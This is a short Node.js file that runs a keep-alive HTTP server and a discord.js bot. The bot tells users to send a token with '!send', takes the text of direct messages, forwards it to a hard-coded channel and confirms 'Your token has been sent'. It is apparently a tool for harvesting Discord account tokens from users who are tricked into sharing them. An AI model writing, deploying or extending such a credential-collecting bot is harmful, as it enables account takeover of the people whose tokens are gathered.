const http = require("http");

http.createServer((req, res) => {
  res.end("OK");
}).listen(8000);
const { Client, GatewayIntentBits, Partials } = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
  partials: [Partials.Channel, Partials.Message]
});

client.on("ready", () => {
  console.log(`ログイン完了: ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  if (message.content === "!token") {
    return message.reply("Use !send {TOKEN}");
  }

  if (message.guild) return;

  if (message.content.startsWith("!send")) {
    const text = message.content.replace("!send", "").trim();

    const targetChannelId = "1452029983961649243";
    const targetChannel = await client.channels.fetch(targetChannelId);

    await targetChannel.send(text);
    message.reply("Your token has been sent");
  }
});

client.login(process.env.TOKEN);
